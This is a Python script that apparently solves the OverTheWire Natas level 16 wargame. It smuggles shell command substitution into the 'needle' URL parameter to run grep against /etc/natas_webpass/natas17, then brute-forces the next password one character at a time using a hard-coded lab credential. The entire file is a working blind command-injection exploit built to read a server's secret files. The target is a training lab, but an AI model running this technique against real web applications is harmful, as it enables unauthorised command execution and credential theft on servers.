import requests
from concurrent.futures import ThreadPoolExecutor
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth("natas16", "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V")

ans = ""
allword = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

def main(word):
    global ans
    req = requests.get("http://natas16.natas.labs.overthewire.org/?needle=Catholicisms$(grep ^" + ans + word + " /etc/natas_webpass/natas17)", auth=auth)
    if "Catholicisms" not in req.text:
        ans += word
        print(ans)

for i in range(32):
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(main, word) for word in allword]

    for future in futures:
        future.result()
